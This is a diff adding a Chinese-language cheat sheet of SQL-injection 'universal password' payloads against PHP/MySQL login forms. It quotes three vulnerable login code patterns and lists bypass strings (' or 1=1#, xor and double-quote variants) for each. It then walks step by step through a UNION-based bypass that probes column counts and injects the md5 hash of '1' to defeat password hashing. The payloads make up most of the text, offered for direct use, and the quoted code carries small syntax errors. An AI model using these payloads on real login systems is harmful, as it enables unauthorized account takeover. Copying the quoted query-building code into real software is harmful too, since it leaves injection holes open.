@@ -1,0 +1,116 @@
+1) 万能语句是对mysql语句的注入，并不是php的注入，因此注释使用的是mysql的
+2) 万能语句若不包含注释那么一般不能用于账号上
+3) 万能语句用在密码上可能会被md5等加密函数加密变异
+4) 如果下面每段中第一种不行，其他机会很渺茫
+ 
+测试表单:
+<form action="checkLogin.php" action="post">
+  账号：<input name="usernm"><br/>
+  密码：<input name="passwd" type="password"><br/>
+  <input type="submit" value="登录">
+</form>
+
+mysql 三种注释(第二种有空格):
+1.#
+2.-- 
+3./**/
+
+==================================================================================================
+代码：
+  $usernm = $_POST['usernm'];
+  $passwd = md5($_POST['passwd']);
+  $sql = "SELECT usernm,passwd FROM users WHERE usernm = '$usernm' AND passwd = '$passwd'"; 
+  #或者: $sql = "SELECT usernm,passwd FROM users WHERE usernm = '".$usernm."' AND passwd = '".$passwd."'"; 
+  $res = mysql_query($sql);
+  if($res){
+     echo "<script>alert('Login Successfully')</script>"
+  }else{
+     echo "Login Failed" 
+  }
+
+万能语句
+' or 1=1#
+' or '1'='1'#
+' or 1=1-- 
+' xor 1=1#
+' xor 1=1-- 
+' or '1'='1			//万能密码：仅限$passwd没有被加密 最后的1后面不能有空格
+' xor '1'='1			//万能密码：仅限$passwd没有被加密 最后的1后面不能有空格
+
+==================================================================================================
+代码：
+  $usernm = $_POST['usernm'];
+  $passwd = md5($_POST['passwd']);
+  $sql = 'select usernm,passwd from users where usernm = "'.$usernm.'" and passwd = "'.$passwd.'"';
+  if($sql = mysql_query($sql))
+     echo "<script>alert('Login Successfully')</script>"
+  else
+     echo "Login Failed"
+
+万能语句
+" or 1=1#
+" or "1"="1"#
+" or 1=1-- 
+" xor 1=1#
+" xor 1=1-- 
+" or "1"="1			//万能密码：仅限$passwd没有被加密 最后的1后面不能有空格
+" xor "1"="1			//万能密码：仅限$passwd没有被加密 最后的1后面不能有空格
+
+==================================================================================================
+代码：
+  $usernm = $_POST['usernm'];
+  $passwd = md5($_POST['passwd']);
+  $sql = "select * from users where usernm = '$usernm'";
+  $res = mysql_query($sql);
+  $row = mysql_fetch_assoc($res);
+  if($row[passwd] == $passwd)
+    echo "<script>alert('Login Successfully')</script>";
+  else
+    echo "Login Failed"
+
+思路：
+-----------------------------------------------------------------------------------------
+首次尝试：
+ 账号上输：' or 1=1 #				
+ 密码为空
+
+  虽然查询结果返回为真，但无法通过if($row[passwd] == $passwd)，查询变量$row[passwd]为空，虽然表单参数$passwd也为空
+  但是别忘了他被md5加密后就不为空了，因此查询变量$row[passwd] 与 表单变量$passwd不相等
+-----------------------------------------------------------------------------------------
+使用union查询：
+ 账号上输：' union select * from users#
+ 密码为空
+
+  虽然这样可以使得$row[passwd]有密码值，但是这个密码值不知道，而且输入的表单变量$passwd为空，加密后与$row[passwd]也不相等
+  因此我们需要自己来决定查询语句返回的密码值是什么，然后在密码表单上填写对应的内容即可
+-----------------------------------------------------------------------------------------
+输出指定值：
+ 账号上输：' union select 1,1 from users#
+ 密码为1
+ 
+  此时如果报错了，返回sql查询联合表的字段不匹配，说明users表不止两个字段，所以只需要不断添加一个字段尝试即可
+  直到添加到与users表查询字段匹配返回正确为止
+------------------------------------------------------------------------------------------
+增量拆表长：
+  账号上输：' union select 1,1,1 from users#
+  密码为1
+
+   此时如果没有sql语法错误，说明users表长为3，但是这里仍然绕不进去，因为别忘了1也是md5加密的，所以自己写一个php页面输出一
+   下看看md5加密后的1值为多少，然后将该值替换万能用户名三个1的其中一个，假如第二个1是密码字段的位置，就替换第二个1为加密值
+------------------------------------------------------------------------------------------
+md5(1) = c4ca4238a0b923820dcc509a6f75849b
+猜解密码位置：
+  账号上输：' union select 1,"c4ca4238a0b923820dcc509a6f75849b",1 from users#
+  密码为1
+
+    注意md5值需要引号引用起来，此时应该可以成功进去了，如果绕不进去，尝试分别替换万能用户名一三位置的1
+    如果懒得这样一个位置一个位置的试，可以直接全部替换成md5加密值，要注意表单有限制的话还需要去掉限制
+
+------------------------------------------------------------------------------------------
+简单暴力：
+  账号上输：' union select "c4ca4238a0b923820dcc509a6f75849b","c4ca4238a0b923820dcc509a6f75849b"，"c4ca4238a0b923820dcc509a6f75849b" from users#
+  密码上输:1
+
+
+
+ 
